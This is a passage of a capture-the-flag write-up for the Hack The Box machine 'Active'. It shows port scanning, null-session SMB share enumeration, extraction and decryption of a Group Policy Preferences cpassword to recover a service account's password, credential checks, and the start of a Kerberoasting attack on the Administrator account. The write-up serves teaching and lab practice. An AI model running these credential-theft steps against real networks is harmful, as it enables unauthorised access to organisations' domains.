</span></span><span class=line><span class=cl><span class=mi>464</span><span class=o>/</span><span class=nx>tcp</span>   <span class=nx>open</span>  <span class=nx>kpasswd5</span><span class=o>?</span>     <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span>
</span></span><span class=line><span class=cl><span class=mi>593</span><span class=o>/</span><span class=nx>tcp</span>   <span class=nx>open</span>  <span class=nx>ncacn_http</span>    <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span> <span class=nx>Microsoft</span> <span class=nx>Windows</span> <span class=nx>RPC</span> <span class=nx>over</span> <span class=nx>HTTP</span> <span class=mf>1.0</span>
</span></span><span class=line><span class=cl><span class=mi>636</span><span class=o>/</span><span class=nx>tcp</span>   <span class=nx>open</span>  <span class=nx>tcpwrapped</span>    <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span>
</span></span><span class=line><span class=cl><span class=mi>3268</span><span class=o>/</span><span class=nx>tcp</span>  <span class=nx>open</span>  <span class=nx>ldap</span>          <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span> <span class=nx>Microsoft</span> <span class=nx>Windows</span> <span class=nx>Active</span> <span class=nx>Directory</span> <span class=nx>LDAP</span> <span class=p>(</span><span class=nx>Domain</span><span class=o>:</span> <span class=nx>active</span><span class=p>.</span><span class=nx>htb</span><span class=p>,</span> <span class=nx>Site</span><span class=o>:</span> <span class=nx>Default</span><span class=o>-</span><span class=nx>First</span><span class=o>-</span><span class=nx>Site</span><span class=o>-</span><span class=nx>Name</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>3269</span><span class=o>/</span><span class=nx>tcp</span>  <span class=nx>open</span>  <span class=nx>tcpwrapped</span>    <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span>
</span></span><span class=line><span class=cl><span class=mi>49152</span><span class=o>/</span><span class=nx>tcp</span> <span class=nx>open</span>  <span class=nx>msrpc</span>         <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span> <span class=nx>Microsoft</span> <span class=nx>Windows</span> <span class=nx>RPC</span>
</span></span><span class=line><span class=cl><span class=mi>49153</span><span class=o>/</span><span class=nx>tcp</span> <span class=nx>open</span>  <span class=nx>msrpc</span>         <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span> <span class=nx>Microsoft</span> <span class=nx>Windows</span> <span class=nx>RPC</span>
</span></span><span class=line><span class=cl><span class=mi>49154</span><span class=o>/</span><span class=nx>tcp</span> <span class=nx>open</span>  <span class=nx>msrpc</span>         <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span> <span class=nx>Microsoft</span> <span class=nx>Windows</span> <span class=nx>RPC</span>
</span></span><span class=line><span class=cl><span class=mi>49155</span><span class=o>/</span><span class=nx>tcp</span> <span class=nx>open</span>  <span class=nx>msrpc</span>         <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span> <span class=nx>Microsoft</span> <span class=nx>Windows</span> <span class=nx>RPC</span>
</span></span><span class=line><span class=cl><span class=mi>49157</span><span class=o>/</span><span class=nx>tcp</span> <span class=nx>open</span>  <span class=nx>ncacn_http</span>    <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span> <span class=nx>Microsoft</span> <span class=nx>Windows</span> <span class=nx>RPC</span> <span class=nx>over</span> <span class=nx>HTTP</span> <span class=mf>1.0</span>
</span></span><span class=line><span class=cl><span class=mi>49158</span><span class=o>/</span><span class=nx>tcp</span> <span class=nx>open</span>  <span class=nx>msrpc</span>         <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span> <span class=nx>Microsoft</span> <span class=nx>Windows</span> <span class=nx>RPC</span>
</span></span><span class=line><span class=cl><span class=mi>49165</span><span class=o>/</span><span class=nx>tcp</span> <span class=nx>open</span>  <span class=nx>msrpc</span>         <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span> <span class=nx>Microsoft</span> <span class=nx>Windows</span> <span class=nx>RPC</span>
</span></span><span class=line><span class=cl><span class=nx>Service</span> <span class=nx>Info</span><span class=o>:</span> <span class=nx>Host</span><span class=o>:</span> <span class=nx>DC</span><span class=p>;</span> <span class=nx>OS</span><span class=o>:</span> <span class=nx>Windows</span><span class=p>;</span> <span class=nx>CPE</span><span class=o>:</span> <span class=nx>cpe</span><span class=o>:</span><span class=err>/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows</span>
</span></span></code></pre></div><p>We can see a lot of ports open including kerberos, SMB, LDAP, RPC, etc. Its most likely a domain controller.</p><p>I start with <code>enum4linux.py</code> for RPC enumeration and we can get the domain details. Lets add them on our hosts file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=o>===========================================================</span>
</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=nx>Domain</span> <span class=nx>Information</span> <span class=nx>via</span> <span class=nx>SMB</span> <span class=nx>session</span> <span class=k>for</span> <span class=mf>10.10.10.100</span>    <span class=o>|</span>
</span></span><span class=line><span class=cl> <span class=o>===========================================================</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Enumerating</span> <span class=nx>via</span> <span class=nx>unauthenticated</span> <span class=nx>SMB</span> <span class=nx>session</span> <span class=nx>on</span> <span class=mi>445</span><span class=o>/</span><span class=nx>tcp</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Found</span> <span class=nx>domain</span> <span class=nx>information</span> <span class=nx>via</span> <span class=nx>SMB</span>
</span></span><span class=line><span class=cl><span class=nx>NetBIOS</span> <span class=nx>computer</span> <span class=nx>name</span><span class=o>:</span> <span class=nx>DC</span>
</span></span><span class=line><span class=cl><span class=nx>NetBIOS</span> <span class=nx>domain</span> <span class=nx>name</span><span class=o>:</span> <span class=nx>ACTIVE</span>
</span></span><span class=line><span class=cl><span class=nx>DNS</span> <span class=nx>domain</span><span class=o>:</span> <span class=nx>active</span><span class=p>.</span><span class=nx>htb</span>
</span></span><span class=line><span class=cl><span class=nx>FQDN</span><span class=o>:</span> <span class=nx>DC</span><span class=p>.</span><span class=nx>active</span><span class=p>.</span><span class=nx>htb</span>
</span></span><span class=line><span class=cl><span class=nx>Derived</span> <span class=nx>membership</span><span class=o>:</span> <span class=nx>domain</span> <span class=nx>member</span>
</span></span><span class=line><span class=cl><span class=nx>Derived</span> <span class=nx>domain</span><span class=o>:</span> <span class=nx>ACTIVE</span>
</span></span></code></pre></div><h3 id=smb-enumeration>SMB Enumeration<a hidden class=anchor aria-hidden=true href=#smb-enumeration>#</a></h3><p>Then we move onto SMB shares. Initially checking for null authentication and we get some shares as readable.</p><p>Here <code>Replication</code> share is readable with null authentication.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>root</span><span class=err>@</span><span class=nx>ea1feccfa881</span><span class=o>:</span><span class=err>/usr/src/crackmapexec# cme smb 10.10.10.100 -u &#39;&#39; -p &#39;&#39; --shares</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=mf>6.1</span> <span class=nx>Build</span> <span class=mi>7601</span> <span class=nx>x64</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>DC</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>active</span><span class=p>.</span><span class=nx>htb</span><span class=p>)</span> <span class=p>(</span><span class=nx>signing</span><span class=o>:</span><span class=nx>True</span><span class=p>)</span> <span class=p>(</span><span class=nx>SMBv1</span><span class=o>:</span><span class=nx>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>active</span><span class=p>.</span><span class=nx>htb</span><span class=err>\</span><span class=o>:</span> 
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Enumerated</span> <span class=nx>shares</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=nx>Share</span>           <span class=nx>Permissions</span>     <span class=nx>Remark</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=o>-----</span>           <span class=o>-----------</span>     <span class=o>------</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=nx>ADMIN$</span>                          <span class=nx>Remote</span> <span class=nx>Admin</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=nx>C$</span>                              <span class=nx>Default</span> <span class=nx>share</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=nx>IPC$</span>                            <span class=nx>Remote</span> <span class=nx>IPC</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=nx>NETLOGON</span>                        <span class=nx>Logon</span> <span class=nx>server</span> <span class=nx>share</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=nx>Replication</span>     <span class=nx>READ</span>            
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=nx>SYSVOL</span>                          <span class=nx>Logon</span> <span class=nx>server</span> <span class=nx>share</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=nx>Users</span>
</span></span></code></pre></div><p>It was a non-default share so I looked into the files and found some interesting information related to GPP in the file <code>active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml</code> .</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/active/anon_smb]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$find</span> <span class=p>.</span> <span class=o>-</span><span class=nx>type</span> <span class=nx>f</span> 
</span></span><span class=line><span class=cl><span class=p>.</span><span class=o>/</span><span class=nx>active</span><span class=p>.</span><span class=nx>htb</span><span class=o>/</span><span class=nx>Policies</span><span class=o>/</span><span class=p>{</span><span class=mi>31</span><span class=nx>B2F340</span><span class=o>-</span><span class=mi>016</span><span class=nx>D</span><span class=o>-</span><span class=mi>11</span><span class=nx>D2</span><span class=o>-</span><span class=mi>945</span><span class=nx>F</span><span class=o>-</span><span class=mi>00</span><span class=nx>C04FB984F9</span><span class=p>}</span><span class=o>/</span><span class=nx>GPT</span><span class=p>.</span><span class=nx>INI</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=o>/</span><span class=nx>active</span><span class=p>.</span><span class=nx>htb</span><span class=o>/</span><span class=nx>Policies</span><span class=o>/</span><span class=p>{</span><span class=mi>31</span><span class=nx>B2F340</span><span class=o>-</span><span class=mi>016</span><span class=nx>D</span><span class=o>-</span><span class=mi>11</span><span class=nx>D2</span><span class=o>-</span><span class=mi>945</span><span class=nx>F</span><span class=o>-</span><span class=mi>00</span><span class=nx>C04FB984F9</span><span class=p>}</span><span class=o>/</span><span class=nx>Group</span> <span class=nx>Policy</span><span class=o>/</span><span class=nx>GPE</span><span class=p>.</span><span class=nx>INI</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=o>/</span><span class=nx>active</span><span class=p>.</span><span class=nx>htb</span><span class=o>/</span><span class=nx>Policies</span><span class=o>/</span><span class=p>{</span><span class=mi>31</span><span class=nx>B2F340</span><span class=o>-</span><span class=mi>016</span><span class=nx>D</span><span class=o>-</span><span class=mi>11</span><span class=nx>D2</span><span class=o>-</span><span class=mi>945</span><span class=nx>F</span><span class=o>-</span><span class=mi>00</span><span class=nx>C04FB984F9</span><span class=p>}</span><span class=o>/</span><span class=nx>MACHINE</span><span class=o>/</span><span class=nx>Microsoft</span><span class=o>/</span><span class=nx>Windows</span> <span class=nx>NT</span><span class=o>/</span><span class=nx>SecEdit</span><span class=o>/</span><span class=nx>GptTmpl</span><span class=p>.</span><span class=nx>inf</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=o>/</span><span class=nx>active</span><span class=p>.</span><span class=nx>htb</span><span class=o>/</span><span class=nx>Policies</span><span class=o>/</span><span class=p>{</span><span class=mi>31</span><span class=nx>B2F340</span><span class=o>-</span><span class=mi>016</span><span class=nx>D</span><span class=o>-</span><span class=mi>11</span><span class=nx>D2</span><span class=o>-</span><span class=mi>945</span><span class=nx>F</span><span class=o>-</span><span class=mi>00</span><span class=nx>C04FB984F9</span><span class=p>}</span><span class=o>/</span><span class=nx>MACHINE</span><span class=o>/</span><span class=nx>Preferences</span><span class=o>/</span><span class=nx>Groups</span><span class=o>/</span><span class=nx>Groups</span><span class=p>.</span><span class=nx>xml</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=o>/</span><span class=nx>active</span><span class=p>.</span><span class=nx>htb</span><span class=o>/</span><span class=nx>Policies</span><span class=o>/</span><span class=p>{</span><span class=mi>31</span><span class=nx>B2F340</span><span class=o>-</span><span class=mi>016</span><span class=nx>D</span><span class=o>-</span><span class=mi>11</span><span class=nx>D2</span><span class=o>-</span><span class=mi>945</span><span class=nx>F</span><span class=o>-</span><span class=mi>00</span><span class=nx>C04FB984F9</span><span class=p>}</span><span class=o>/</span><span class=nx>MACHINE</span><span class=o>/</span><span class=nx>Registry</span><span class=p>.</span><span class=nx>pol</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=o>/</span><span class=nx>active</span><span class=p>.</span><span class=nx>htb</span><span class=o>/</span><span class=nx>Policies</span><span class=o>/</span><span class=p>{</span><span class=mi>6</span><span class=nx>AC1786C</span><span class=o>-</span><span class=mi>016</span><span class=nx>F</span><span class=o>-</span><span class=mi>11</span><span class=nx>D2</span><span class=o>-</span><span class=mi>945</span><span class=nx>F</span><span class=o>-</span><span class=mi>00</span><span class=nx>C04fB984F9</span><span class=p>}</span><span class=o>/</span><span class=nx>GPT</span><span class=p>.</span><span class=nx>INI</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=o>/</span><span class=nx>active</span><span class=p>.</span><span class=nx>htb</span><span class=o>/</span><span class=nx>Policies</span><span class=o>/</span><span class=p>{</span><span class=mi>6</span><span class=nx>AC1786C</span><span class=o>-</span><span class=mi>016</span><span class=nx>F</span><span class=o>-</span><span class=mi>11</span><span class=nx>D2</span><span class=o>-</span><span class=mi>945</span><span class=nx>F</span><span class=o>-</span><span class=mi>00</span><span class=nx>C04fB984F9</span><span class=p>}</span><span class=o>/</span><span class=nx>MACHINE</span><span class=o>/</span><span class=nx>Microsoft</span><span class=o>/</span><span class=nx>Windows</span> <span class=nx>NT</span><span class=o>/</span><span class=nx>SecEdit</span><span class=o>/</span><span class=nx>GptTmpl</span><span class=p>.</span><span class=nx>inf</span>
</span></span><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/active/anon_smb]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$cat</span> <span class=nx>active</span><span class=p>.</span><span class=nx>htb</span><span class=o>/</span><span class=nx>Policies</span><span class=o>/</span><span class=p>{</span><span class=mi>31</span><span class=nx>B2F340</span><span class=o>-</span><span class=mi>016</span><span class=nx>D</span><span class=o>-</span><span class=mi>11</span><span class=nx>D2</span><span class=o>-</span><span class=mi>945</span><span class=nx>F</span><span class=o>-</span><span class=mi>00</span><span class=nx>C04FB984F9</span><span class=p>}</span><span class=o>/</span><span class=nx>MACHINE</span><span class=o>/</span><span class=nx>Preferences</span><span class=o>/</span><span class=nx>Groups</span><span class=o>/</span><span class=nx>Groups</span><span class=p>.</span><span class=nx>xml</span>
</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>xml</span> <span class=nx>version</span><span class=o>=</span><span class=s2>&#34;1.0&#34;</span> <span class=nx>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=o>?&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>Groups</span> <span class=na>clsid</span><span class=o>=</span><span class=s>&#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&#34;</span><span class=p>&gt;&lt;</span><span class=nt>User</span> <span class=na>clsid</span><span class=o>=</span><span class=s>&#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;active.htb\SVC_TGS&#34;</span> <span class=na>image</span><span class=o>=</span><span class=s>&#34;2&#34;</span> <span class=na>changed</span><span class=o>=</span><span class=s>&#34;2018-07-18 20:46:06&#34;</span> <span class=na>uid</span><span class=o>=</span><span class=s>&#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&#34;</span><span class=p>&gt;&lt;</span><span class=nt>Properties</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;U&#34;</span> <span class=na>newName</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=na>fullName</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=na>description</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=na>cpassword</span><span class=o>=</span><span class=s>&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span> <span class=na>changeLogon</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>noChange</span><span class=o>=</span><span class=s>&#34;1&#34;</span> <span class=na>neverExpires</span><span class=o>=</span><span class=s>&#34;1&#34;</span> <span class=na>acctDisabled</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>userName</span><span class=o>=</span><span class=s>&#34;active.htb\SVC_TGS&#34;</span><span class=p>/&gt;&lt;/</span><span class=nt>User</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>Groups</span><span class=p>&gt;</span>
</span></span></code></pre></div><h3 id=group-policy-preferences>Group Policy Preferences<a hidden class=anchor aria-hidden=true href=#group-policy-preferences>#</a></h3><p>It provides the useful capability to leverage Group Policy to “deploy” <code>scheduled tasks with explicit credentials</code> and change the local admin passwords on large numbers of computers at once – probably the two most popular usage scenarios.</p><p>One of the most useful features of Group Policy Preferences (GPP) is the ability to <code>store and use credentials in several scenarios.</code> These include: Map drives (Drives.xml), Create Local Users, Data Sources (DataSources.xml), Printer configuration (Printers.xml), Create/Update Services (Services.xml), Scheduled Tasks (ScheduledTasks.xml), Change local Administrator passwords, etc.</p><p>When a new GPP (Group Policy Preference) is created, a corresponding <code>XML file is generated to store the relevant configuration data</code>. If a password is present, it is encrypted using <code>AES-256-bit encryption</code>. Within the XML file, the <code>cpassword</code> field contains the encrypted password. However, in around 2012, Microsoft released the <code>AES private key</code>, which made it relatively easy to decrypt the password. <a href=https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be>link</a></p><p>The tool gpp-decrypt automates the process for us and we can get the password from the encrypted text.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=err>✗</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/active/svc_tgs]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$gpp</span><span class=o>-</span><span class=nx>decrypt</span> <span class=s1>&#39;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#39;</span>
</span></span><span class=line><span class=cl><span class=nx>GPPstillStandingStrong2k18</span>
</span></span></code></pre></div><p>After decrypting the password, we can verify it using either <code>kerbrute</code> or <code>crackmapexec</code>. In this case, I confirmed it using the latter.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>root</span><span class=err>@</span><span class=nx>ea1feccfa881</span><span class=o>:</span><span class=err>/usr/src/crackmapexec# cme smb 10.10.10.100 -u svc_tgs -p &#39;GPPstillStandingStrong2k18&#39; --shares</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=mf>6.1</span> <span class=nx>Build</span> <span class=mi>7601</span> <span class=nx>x64</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>DC</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>active</span><span class=p>.</span><span class=nx>htb</span><span class=p>)</span> <span class=p>(</span><span class=nx>signing</span><span class=o>:</span><span class=nx>True</span><span class=p>)</span> <span class=p>(</span><span class=nx>SMBv1</span><span class=o>:</span><span class=nx>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>active</span><span class=p>.</span><span class=nx>htb</span><span class=err>\</span><span class=nx>svc_tgs</span><span class=o>:</span><span class=nx>GPPstillStandingStrong2k18</span> 
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Enumerated</span> <span class=nx>shares</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=nx>Share</span>           <span class=nx>Permissions</span>     <span class=nx>Remark</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=o>-----</span>           <span class=o>-----------</span>     <span class=o>------</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=nx>ADMIN$</span>                          <span class=nx>Remote</span> <span class=nx>Admin</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=nx>C$</span>                              <span class=nx>Default</span> <span class=nx>share</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=nx>IPC$</span>                            <span class=nx>Remote</span> <span class=nx>IPC</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=nx>NETLOGON</span>        <span class=nx>READ</span>            <span class=nx>Logon</span> <span class=nx>server</span> <span class=nx>share</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=nx>Replication</span>     <span class=nx>READ</span>            
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=nx>SYSVOL</span>          <span class=nx>READ</span>            <span class=nx>Logon</span> <span class=nx>server</span> <span class=nx>share</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>10.10.10.100</span>    <span class=mi>445</span>    <span class=nx>DC</span>               <span class=nx>Users</span>           <span class=nx>READ</span>
</span></span></code></pre></div><h3 id=kerberoasting>Kerberoasting<a hidden class=anchor aria-hidden=true href=#kerberoasting>#</a></h3><p>Normally, If we don’t have shell on the machine but credentials we can go for <code>kerberoasting</code> for lateral movement or look into LDAP for trying to understand the domain better.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/active/anon_smb]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$ldapsearch</span> <span class=o>-</span><span class=nx>x</span> <span class=o>-</span><span class=nx>H</span> <span class=nx>ldap</span><span class=o>:</span><span class=c1>//10.10.10.100 -D &#39;svc_tgs&#39; -w &#39;GPPstillStandingStrong2k18&#39; -b &#39;DC=active,DC=htb&#39; &#39;(objectClass=user)&#39;
</span></span></span></code></pre></div><p>While looking at user accounts our attention went to the fact that the administrator account has <code>ServicePrincipalName</code> as not null.</p><p>We know that a domain account is being used as a service if the <code>SPN</code> is not null. The goal of <code>kerberoasting</code> is to harvest <code>TGS</code> tickets of services that run on behalf of user accounts. And we know that some parts of the ticket are encrypted with keys derived from user passwords. Thus we can crack them offline.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>#</span> <span class=nx>Administrator</span><span class=p>,</span> <span class=nx>Users</span><span class=p>,</span> <span class=nx>active</span><span class=p>.</span><span class=nx>htb</span>
</span></span><span class=line><span class=cl><span class=nx>dn</span><span class=o>:</span> <span class=nx>CN</span><span class=o>=</span><span class=nx>Administrator</span><span class=p>,</span><span class=nx>CN</span><span class=o>=</span><span class=nx>Users</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>active</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>htb</span>
</span></span><span class=line><span class=cl><span class=nx>objectClass</span><span class=o>:</span> <span class=nx>top</span>
</span></span><span class=line><span class=cl><span class=nx>objectClass</span><span class=o>:</span> <span class=nx>person</span>
</span></span><span class=line><span class=cl><span class=nx>objectClass</span><span class=o>:</span> <span class=nx>organizationalPerson</span>
</span></span><span class=line><span class=cl><span class=nx>objectClass</span><span class=o>:</span> <span class=nx>user</span>
</span></span><span class=line><span class=cl><span class=nx>cn</span><span class=o>:</span> <span class=nx>Administrator</span>
</span></span><span class=line><span class=cl><span class=nx>description</span><span class=o>:</span> <span class=nx>Built</span><span class=o>-</span><span class=k>in</span> <span class=nx>account</span> <span class=k>for</span> <span class=nx>administering</span> <span class=nx>the</span> <span class=nx>computer</span><span class=o>/</span><span class=nx>domain</span>
</span></span><span class=line><span class=cl><span class=nx>distinguishedName</span><span class=o>:</span> <span class=nx>CN</span><span class=o>=</span><span class=nx>Administrator</span><span class=p>,</span><span class=nx>CN</span><span class=o>=</span><span class=nx>Users</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>active</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>htb</span>
</span></span><span class=line><span class=cl><span class=nx>instanceType</span><span class=o>:</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=nx>whenCreated</span><span class=o>:</span> <span class=mf>20180718184911.0</span><span class=nx>Z</span>
</span></span><span class=line><span class=cl><span class=nx>whenChanged</span><span class=o>:</span> <span class=mf>20231018154548.0</span><span class=nx>Z</span>
</span></span><span class=line><span class=cl><span class=nx>uSNCreated</span><span class=o>:</span> <span class=mi>8196</span>
</span></span><span class=line><span class=cl><span class=nx>memberOf</span><span class=o>:</span> <span class=nx>CN</span><span class=o>=</span><span class=nx>Group</span> <span class=nx>Policy</span> <span class=nx>Creator</span> <span class=nx>Owners</span><span class=p>,</span><span class=nx>CN</span><span class=o>=</span><span class=nx>Users</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>active</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>htb</span>
</span></span><span class=line><span class=cl><span class=nx>memberOf</span><span class=o>:</span> <span class=nx>CN</span><span class=o>=</span><span class=nx>Domain</span> <span class=nx>Admins</span><span class=p>,</span><span class=nx>CN</span><span class=o>=</span><span class=nx>Users</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>active</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>htb</span>
